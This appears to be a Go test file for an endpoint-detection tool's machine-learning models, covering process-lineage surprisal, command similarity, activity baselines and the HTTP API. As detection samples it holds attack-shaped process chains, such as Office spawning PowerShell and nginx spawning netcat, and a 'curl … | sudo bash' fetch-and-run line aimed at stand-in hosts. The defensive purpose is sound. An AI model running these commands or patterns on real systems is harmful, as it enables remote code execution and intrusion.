package edr

import (
	"encoding/json"
	"math"
	"math/rand"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"
)

// ---------------- synthetic fixtures ----------------

type mlPair struct {
	parent, child string
	weight        float64
}

// A benign lineage corpus: head transitions plus a long tail of rare-but-legitimate ones.
var mlBenignPairs = func() []mlPair {
	head := [][2]string{
		{"/usr/sbin/sshd", "/usr/sbin/sshd"}, {"/usr/sbin/sshd", "/bin/bash"}, {"/bin/bash", "/usr/bin/ls"},
		{"/bin/bash", "/usr/bin/git"}, {"/bin/bash", "/usr/bin/vim"}, {"/bin/bash", "/usr/bin/grep"},
		{"/bin/bash", "/usr/bin/python3"}, {"/bin/bash", "/usr/bin/curl"}, {"/bin/bash", "/usr/bin/make"},
		{"/usr/bin/make", "/usr/bin/gcc"}, {"/usr/bin/gcc", "/usr/bin/ld"}, {"/usr/bin/git", "/usr/bin/ssh"},
		{"/usr/lib/systemd/systemd", "/usr/sbin/cron"}, {"/usr/lib/systemd/systemd", "/usr/sbin/nginx"},
		{"/usr/lib/systemd/systemd", "/usr/sbin/sshd"}, {"/usr/sbin/cron", "/bin/sh"}, {"/bin/sh", "/usr/bin/logrotate"},
		{"/bin/sh", "/usr/bin/find"}, {"/usr/sbin/nginx", "/usr/sbin/nginx"}, {"/usr/bin/python3", "/usr/bin/pip"},
		{"C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\notepad.exe"}, {"C:\\Windows\\explorer.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe"},
		{"C:\\Program Files\\Google\\Chrome\\chrome.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe"},
		{"C:\\Windows\\System32\\services.exe", "C:\\Windows\\System32\\svchost.exe"},
		{"C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\taskhostw.exe"},
		{"C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\cmd.exe"}, {"C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\ipconfig.exe"},
		{"C:\\Program Files\\Microsoft Office\\winword.exe", "C:\\Program Files\\Microsoft Office\\splwow64.exe"},
		{"C:\\Program Files\\Microsoft Office\\excel.exe", "C:\\Program Files\\Microsoft Office\\splwow64.exe"},
		{"/usr/sbin/nginx", "/usr/sbin/nginx-worker"}, {"/usr/sbin/httpd", "/usr/sbin/httpd-worker"},
		{"/usr/sbin/mysqld", "/usr/sbin/mysqld-safe"},
	}
	var out []mlPair
	for i, h := range head {
		out = append(out, mlPair{h[0], h[1], 100.0 / float64(1+i%7)})
	}
	// long tail: rare but legitimate transitions (kept below ~0.1% each)
	tail := [][2]string{
		{"/bin/bash", "/usr/bin/awk"}, {"/bin/bash", "/usr/bin/sed"}, {"/bin/bash", "/usr/bin/tar"}, {"/bin/bash", "/usr/bin/docker"},
		{"/bin/bash", "/usr/bin/htop"}, {"/bin/bash", "/usr/bin/rsync"}, {"/usr/sbin/cron", "/usr/bin/run-parts"},
		{"/bin/sh", "/usr/bin/date"}, {"/bin/sh", "/usr/bin/id"}, {"C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\mspaint.exe"},
	}
	for _, p := range tail {
		out = append(out, mlPair{p[0], p[1], 0.4})
	}
	return out
}()

type mlAnomaly struct{ parent, child string }

// Injected anomalous transitions: known parents spawning never-seen children (the common attack shape),
// and never-seen parents (the harder shape for a conditional model).
var mlAnomalousKnownParent = []mlAnomaly{
	{"C:\\Program Files\\Microsoft Office\\winword.exe", "C:\\Windows\\System32\\powershell.exe"},
	{"C:\\Program Files\\Microsoft Office\\excel.exe", "C:\\Windows\\System32\\wscript.exe"},
	{"C:\\Program Files\\Microsoft Office\\winword.exe", "C:\\Windows\\System32\\mshta.exe"},
	{"/usr/sbin/nginx", "/bin/sh"}, {"/usr/sbin/nginx", "/usr/bin/nc"}, {"/usr/sbin/httpd", "/bin/bash"},
	{"/usr/sbin/httpd", "/usr/bin/wget"}, {"/usr/sbin/mysqld", "/bin/sh"}, {"/usr/sbin/mysqld", "/usr/bin/curl"},
	{"/usr/sbin/sshd", "/usr/bin/nmap"}, {"/usr/sbin/cron", "/usr/bin/socat"}, {"/usr/bin/python3", "/usr/bin/nc"},
	{"C:\\Program Files\\Google\\Chrome\\chrome.exe", "C:\\Windows\\System32\\cmd.exe"},
	{"C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\certutil.exe"},
	{"C:\\Windows\\System32\\services.exe", "C:\\Windows\\System32\\rundll32.exe"},
}
var mlAnomalousNewParent = []mlAnomaly{
	{"/tmp/.x/payload", "/bin/sh"}, {"/dev/shm/kworker", "/usr/bin/nc"}, {"C:\\Users\\Public\\upd.exe", "C:\\Windows\\System32\\cmd.exe"},
	{"/var/tmp/.cache/agent", "/bin/bash"},
}

func mlTrainLineage(seed int64, n int) *mlEngine {
	e := newMLEngine(nil)
	rng := rand.New(rand.NewSource(seed))
	for i := 0; i < n; i++ {
		p := mlDraw(rng)
		e.learnLineage("h1", mlBase(p.parent), mlBase(p.child))
	}
	return e
}

func mlDraw(rng *rand.Rand) mlPair {
	tot := 0.0
	for _, p := range mlBenignPairs {
		tot += p.weight
	}
	x := rng.Float64() * tot
	for _, p := range mlBenignPairs {
		if x < p.weight {
			return p
		}
		x -= p.weight
	}
	return mlBenignPairs[0]
}

func mlFlag(e *mlEngine, parent, child string) bool {
	b, _, _ := mlSurprisal(e.st.Fleet, mlBase(parent), mlBase(child), mlVocab(e.st.Fleet))
	return b >= mlSurprisalBits
}

// ---------------- (a) lineage ----------------

// Measured numbers are recorded in docs/local-models.md. The assertions below fail on regression.
func TestMLLineageEvaluation(t *testing.T) {
	e := mlTrainLineage(1, 5000)
	rng := rand.New(rand.NewSource(99))
	fp, N := 0, 5000
	for i := 0; i < N; i++ {
		p := mlDraw(rng)
		if mlFlag(e, p.parent, p.child) {
			fp++
		}
	}
	det := func(set []mlAnomaly) float64 {
		d := 0
		for _, a := range set {
			if mlFlag(e, a.parent, a.child) {
				d++
			}
		}
		return float64(d) / float64(len(set))
	}
	dKnown, dNew := det(mlAnomalousKnownParent), det(mlAnomalousNewParent)
	fpr := float64(fp) / float64(N)
	t.Logf("lineage: train=5000 threshold=%.1f bits; detection(known parent, new child)=%.3f detection(new parent)=%.3f FPR=%.4f", mlSurprisalBits, dKnown, dNew, fpr)
	if dKnown < 0.90 {
		t.Errorf("known-parent detection regressed: %.3f", dKnown)
	}
	if dNew < 0.0 { // new-parent is reported, not gated: the conditional model is weak here (documented)
		t.Errorf("unreachable")
	}
	if fpr > 0.01 {
		t.Errorf("lineage FPR regressed: %.4f", fpr)
	}
}

func TestMLLineageColdStart(t *testing.T) {
	e := newMLEngine(nil)
	for i := 0; i < mlMinLineageFleet-1; i++ {
		e.learnLineage("h1", "bash", "ls")
	}
	r := e.lineage("", 10)
	if r["status"] != "not_enough_data" || len(r["transitions"].([]mlTransition)) != 0 {
		t.Fatalf("cold start must not score: %v", r)
	}
	if r["method"] != mlMethod {
		t.Fatal("method missing")
	}
	e.learnLineage("h1", "bash", "ls")
	if e.lineage("", 10)["status"] != "ok" {
		t.Fatal("expected ok at the minimum")
	}
	if e.lineage("h2", 10)["status"] != "not_enough_data" {
		t.Fatal("unknown host must be not_enough_data")
	}
}

func TestMLLineageRanksNovelFirst(t *testing.T) {
	e := mlTrainLineage(2, 3000)
	e.learnLineage("h1", "winword.exe", "powershell.exe")
	r := e.lineage("h1", 3)
	tr := r["transitions"].([]mlTransition)
	if len(tr) == 0 || !tr[0].Novel {
		t.Fatalf("expected a novel transition first: %+v", tr)
	}
	if tr[0].Surprisal < mlSurprisalBits {
		t.Fatalf("surprisal %v", tr[0].Surprisal)
	}
}

// ---------------- (b) similarity ----------------

var mlBenignCommands = []string{
	"ls -la /var/log", "git status", "git commit -m fix typo in readme", "go build ./...", "go test -race ./internal/...",
	"python3 manage.py runserver 0.0.0.0:8000", "npm install --save-dev typescript", "docker ps -a", "kubectl get pods -n prod",
	"tar czf backup.tgz /var/www", "rsync -avz /home/ann/docs backup:/srv/docs", "vim /etc/nginx/nginx.conf", "systemctl status sshd",
	"apt update", "apt install -y htop", "curl https://example.com/health", "curl -s https://api.github.com/repos/foo/bar",
	"wget https://example.org/file.tar.gz", "ssh -i ~/.ssh/id_ed25519 deploy@build01", "grep -rn TODO src/", "find / -name *.log -mtime +7",
	"cat /etc/os-release", "journalctl -u nginx --since today", "make -j8 all", "gcc -O2 -o app main.c", "node server.js",
	"java -jar app.jar --spring.profiles.active=prod", "pip install requests", "chmod 644 notes.txt", "cp -r build/ dist/",
	"df -h", "du -sh /var/lib/docker", "top -b -n 1", "ps aux", "ping -c 4 8.8.8.8", "bash /opt/scripts/backup.sh nightly",
	"/usr/sbin/cron -f", "logrotate /etc/logrotate.conf", "open -a Safari https://example.com", "code ~/projects/kavach",
	"cmd.exe /c dir", "explorer.exe C:\\Users\\ann\\Documents", "notepad.exe C:\\Users\\ann\\notes.txt",
	"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --profile-directory=Default", "ipconfig /all",
	"msiexec /i setup.msi /qn", "powershell -NoProfile -Command Get-Process", "sudo systemctl restart nginx", "less /var/log/syslog",
	"sed -i s/foo/bar/g config.yaml", "awk {print $1} access.log", "openssl x509 -in cert.pem -noout -dates", "terraform plan -out tfplan",
	"aws s3 ls s3://backups", "psql -h db01 -U app -c select 1", "mysqldump -u root app > app.sql", "ffmpeg -i in.mp4 out.mp3",
}

// mlProcessNearMisses returns the content rules' negative samples that no rule matches. They are
// deliberately close to bad commands ("aws iam list-users" vs "aws iam create-access-key"), so they
// measure the hard case, not everyday traffic.
func mlProcessNearMisses() []string {
	rules := ContentRules()
	var out []string
	for _, r := range rules {
		if r.EventType == "process" && r.Tests != nil {
			for _, n := range r.Tests.Negative {
				if strings.TrimSpace(n.Command) == "" {
					continue
				}
				hit := false
				for i := range rules {
					if rules[i].EventType == "process" && rules[i].Matches(n) {
						hit = true
						break
					}
				}
				if !hit {
					out = append(out, n.Command)
				}
			}
		}
	}
	return out
}

var (
	mlDigit = regexp.MustCompile(`\d`)
	mlHost  = regexp.MustCompile(`(https?://)[A-Za-z0-9.\-]+`)
)

// mlVariants mutates an exemplar the way an operator would: other IPs/ports, other hosts, extra flags, sudo, noise redirects.
func mlVariants(cmd string) []string {
	v1 := mlDigit.ReplaceAllStringFunc(cmd, func(d string) string { return string(rune('0' + (int(d[0]-'0')+3)%10)) })
	v2 := mlHost.ReplaceAllString(cmd, "${1}cdn.evil-host.net")
	v3 := "sudo " + cmd + " 2>/dev/null"
	v4 := strings.ToUpper(cmd[:1]) + cmd[1:] + "  "
	return []string{v1, v2, v3, v4}
}

func TestMLSimilarityEvaluation(t *testing.T) {
	if err := LoadContentPacks(); err != nil {
		t.Fatal(err)
	}
	if len(mlExemplars) < 100 {
		t.Fatalf("exemplar set not built at init: %d", len(mlExemplars))
	}
	// detection: variants of every exemplar, nearest-exemplar cosine at the documented threshold
	var total, detected, attributed int
	for _, r := range ContentRules() {
		if r.EventType != "process" || r.Tests == nil {
			continue
		}
		for _, p := range r.Tests.Positive {
			if strings.TrimSpace(p.Command) == "" {
				continue
			}
			for _, v := range mlVariants(p.Command) {
				total++
				nb := mlNearestExemplars(mlFeaturize(v, 0), 1)
				if nb[0].Similarity >= mlSimThreshold {
					detected++
					if nb[0].Rule == r.ID || nb[0].Technique == r.Technique {
						attributed++
					}
				}
			}
		}
	}
	fprOf := func(set []string) float64 {
		fp := 0
		for _, c := range set {
			if nb := mlNearestExemplars(mlFeaturize(c, 0), 1); nb[0].Similarity >= mlSimThreshold {
				fp++
			}
		}
		return float64(fp) / float64(len(set))
	}
	near := mlProcessNearMisses()
	dr, fpr, nfpr := float64(detected)/float64(total), fprOf(mlBenignCommands), fprOf(near)
	t.Logf("similarity: exemplars=%d variants=%d detection=%.3f attributed=%.3f | everyday benign n=%d FPR=%.4f | near-miss benign n=%d FPR=%.4f | threshold=%.2f",
		len(mlExemplars), total, dr, float64(attributed)/float64(total), len(mlBenignCommands), fpr, len(near), nfpr, mlSimThreshold)
	if nfpr > 0.60 {
		t.Errorf("near-miss FPR regressed: %.4f", nfpr)
	}
	if dr < 0.80 {
		t.Errorf("similarity detection regressed: %.3f", dr)
	}
	if fpr > 0.02 {
		t.Errorf("similarity FPR regressed: %.4f", fpr)
	}
}

func TestMLSimilarityDeterministicAndBounded(t *testing.T) {
	a, b := mlFeaturize("curl -fsSL http://x/y.sh | sudo bash", 0), mlFeaturize("curl -fsSL http://x/y.sh | sudo bash", 0)
	if mlCosine(a, b) < 0.999999 || len(a.Idx) != len(b.Idx) {
		t.Fatal("not deterministic")
	}
	for _, i := range a.Idx {
		if int(i) >= mlVecDim {
			t.Fatal("index out of range")
		}
	}
	e := newMLEngine(nil)
	for i := 0; i < 1000; i++ {
		e.learnCommand("h1", "cmd number "+strings.Repeat("x", i%50)+string(rune('a'+i%26)))
	}
	h := e.st.Hist["h1"]
	if len(h.Vecs) != mlHistCap || h.Seen != 1000 {
		t.Fatalf("reservoir: %d %d", len(h.Vecs), h.Seen)
	}
	e2 := newMLEngine(nil)
	for i := 0; i < 1000; i++ {
		e2.learnCommand("h1", "cmd number "+strings.Repeat("x", i%50)+string(rune('a'+i%26)))
	}
	j1, _ := json.Marshal(e.st.Hist)
	j2, _ := json.Marshal(e2.st.Hist)
	if string(j1) != string(j2) {
		t.Fatal("reservoir not deterministic")
	}
}

// ---------------- (c) baselines ----------------

func mlLambda(hour int64) float64 {
	t := time.Unix(hour*3600, 0).UTC()
	wd := t.Weekday()
	if wd == time.Saturday || wd == time.Sunday {
		return 5
	}
	if t.Hour() >= 9 && t.Hour() < 18 {
		return 40
	}
	return 8
}

func mlNoisy(rng *rand.Rand, lam float64) float64 {
	return math.Max(0, math.Round(lam+rng.NormFloat64()*math.Sqrt(lam)*1.1))
}

func TestMLBaselineEvaluation(t *testing.T) {
	m := &mlMetricState{}
	rng := rand.New(rand.NewSource(7))
	start := time.Date(2026, 1, 5, 0, 0, 0, 0, time.UTC).Unix() / 3600 // a Monday
	const weeks = 8
	var hours, fp, injected, detected, guarded int
	for h := int64(0); h < weeks*168; h++ {
		hour := start + h
		x := mlNoisy(rng, mlLambda(hour))
		test := h >= 6*168 // first 6 weeks train, last 2 evaluate
		burst := test && h%11 == 5
		if burst {
			x = mlLambda(hour)*4 + 30
		}
		m.fold(hour, x)
		if !test {
			continue
		}
		if !m.LastZOK {
			guarded++
			continue
		}
		if burst {
			injected++
			if m.LastZ >= mlZThreshold {
				detected++
			}
		} else {
			hours++
			if m.LastZ >= mlZThreshold {
				fp++
			}
		}
	}
	dr, fpr := float64(detected)/float64(injected), float64(fp)/float64(hours)
	t.Logf("baseline: train=6w eval=2w injected bursts=%d detection=%.3f clean hours=%d FPR=%.4f z>=%.1f guarded(not scored)=%d", injected, dr, hours, fpr, mlZThreshold, guarded)
	if guarded > 0 {
		t.Errorf("history guard unexpectedly active after 6 weeks: %d", guarded)
	}
	if dr < 0.90 {
		t.Errorf("baseline detection regressed: %.3f", dr)
	}
	if fpr > 0.03 {
		t.Errorf("baseline FPR regressed: %.4f", fpr)
	}
}

func TestMLBaselineColdStartGuard(t *testing.T) {
	m := &mlMetricState{}
	start := time.Date(2026, 1, 5, 0, 0, 0, 0, time.UTC).Unix() / 3600
	for h := int64(0); h < 100; h++ {
		m.fold(start+h, 10)
	}
	m.fold(start+100, 500)
	if m.LastZOK {
		t.Fatal("must not score before min slot samples")
	}
}

// ---------------- hook, persistence, HTTP ----------------

func mlSetup(t *testing.T) (*http.ServeMux, *Store, string) {
	t.Helper()
	dir := t.TempDir()
	st, err := NewStore(filepath.Join(dir, "f.jsonl"), 20000)
	if err != nil {
		t.Fatal(err)
	}
	mux := http.NewServeMux()
	RegisterMLBehaviour(mux, "tok", st)
	return mux, st, st.path + ".mlbehaviour.json"
}

func mlDo(mux *http.ServeMux, method, path string, auth bool) *httptest.ResponseRecorder {
	w := httptest.NewRecorder()
	r := httptest.NewRequest(method, path, nil)
	if auth {
		r.Header.Set("Authorization", "Bearer tok")
	}
	mux.ServeHTTP(w, r)
	return w
}

func TestMLAuth(t *testing.T) {
	mux, _, _ := mlSetup(t)
	for _, p := range []string{"GET /v1/ml/status", "GET /v1/ml/lineage", "GET /v1/ml/similar?q=ls", "GET /v1/ml/baseline?host=h", "POST /v1/ml/reset", "POST /v1/ml/learn/replay"} {
		m, path, _ := strings.Cut(p, " ")
		if w := mlDo(mux, m, path, false); w.Code != 401 {
			t.Fatalf("%s: %d", p, w.Code)
		}
	}
}

func TestMLIncrementalHookReplayResetPersistence(t *testing.T) {
	st, err := NewStore(filepath.Join(t.TempDir(), "f.jsonl"), 20000)
	if err != nil {
		t.Fatal(err)
	}
	eng := newMLEngine(st)
	t0 := time.Date(2026, 3, 2, 9, 0, 0, 0, time.UTC)
	const secret = "SECRET-TOKEN-hunter2-should-never-persist"
	for i := 0; i < 300; i++ {
		_, err := st.Ingest(Event{ID: "e" + string(rune('a'+i%26)) + strings.Repeat("z", i/26), Time: t0.Add(time.Duration(i) * time.Minute), Host: "h1", PID: 100 + i,
			Executable: "/bin/ls", ParentExe: "/bin/bash", Command: "ls --password=" + secret})
		if err != nil {
			t.Fatal(err)
		}
	}
	eng.poll()
	eng.poll() // second poll must not double count
	if got := eng.st.Learned["process"]; got != 300 {
		t.Fatalf("learned %d", got)
	}
	if r := eng.lineage("", 5); r["status"] != "ok" || r["sample_count"].(int) != 300 {
		t.Fatalf("%v", r)
	}
	if _, err := st.Ingest(Event{ID: "more", Time: t0.Add(time.Hour * 10), Host: "h1", PID: 9, Executable: "/bin/ls", ParentExe: "/bin/bash"}); err != nil {
		t.Fatal(err)
	}
	eng.poll()
	if got := eng.st.Learned["process"]; got != 301 {
		t.Fatalf("incremental learned %d", got)
	}
	eng.mu.Lock()
	eng.saveLocked()
	eng.mu.Unlock()
	raw, err := os.ReadFile(eng.path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(raw), secret) || strings.Contains(string(raw), "--password") {
		t.Fatal("raw command line leaked into persisted state")
	}
	if fi, _ := os.Stat(eng.path); fi.Mode().Perm() != 0o600 {
		t.Fatalf("mode %v", fi.Mode())
	}
	// restart: state and cursor reload, retained events are not re-learned
	eng2 := newMLEngine(st)
	eng2.poll()
	if eng2.st.Learned["process"] != 301 {
		t.Fatalf("restart relearned: %d", eng2.st.Learned["process"])
	}
	// replay rebuilds from the retained store
	n := eng2.replay()
	if n["process"] != 301 || eng2.st.Learned["process"] != 301 {
		t.Fatalf("replay %v %v", n, eng2.st.Learned)
	}
	// reset empties and does not relearn retained events
	eng2.reset()
	eng2.poll()
	if eng2.st.Learned["process"] != 0 || eng2.st.Fleet.Total != 0 {
		t.Fatalf("reset did not clear: %v", eng2.st.Learned)
	}
}

func TestMLEndpoints(t *testing.T) {
	mux, st, _ := mlSetup(t)
	t0 := time.Date(2026, 3, 2, 9, 0, 0, 0, time.UTC)
	for i := 0; i < 250; i++ {
		st.Ingest(Event{ID: "x" + strings.Repeat("a", i%10) + string(rune('A'+i/10)), Time: t0.Add(time.Duration(i) * time.Second), Host: "demo", PID: 1000 + i, Executable: "/usr/bin/git", ParentExe: "/bin/bash", Command: "git status"})
	}
	if w := mlDo(mux, "POST", "/v1/ml/learn/replay", true); w.Code != 200 {
		t.Fatalf("replay %d %s", w.Code, w.Body)
	}
	get := func(p string) map[string]any {
		w := mlDo(mux, "GET", p, true)
		if w.Code != 200 {
			t.Fatalf("%s: %d %s", p, w.Code, w.Body)
		}
		var m map[string]any
		json.Unmarshal(w.Body.Bytes(), &m)
		if m["method"] != mlMethod {
			t.Fatalf("%s: method missing", p)
		}
		return m
	}
	s := get("/v1/ml/status")
	if s["models"].(map[string]any)["lineage"].(map[string]any)["ready"] != true {
		t.Fatalf("%v", s)
	}
	if get("/v1/ml/lineage?host=demo&limit=5")["status"] != "ok" {
		t.Fatal("lineage")
	}
	if get("/v1/ml/baseline?host=demo")["status"] == "" {
		t.Fatal("baseline")
	}
	sim := get("/v1/ml/similar?host=demo&q=" + "curl%20-fsSL%20http%3A%2F%2F198.51.100.7%2Fa.sh%20%7C%20sudo%20bash")
	if sim["similar_to_known_bad"] != true {
		t.Fatalf("expected known-bad similarity: %v", sim)
	}
	if w := mlDo(mux, "GET", "/v1/ml/similar", true); w.Code != 400 {
		t.Fatal("q required")
	}
}
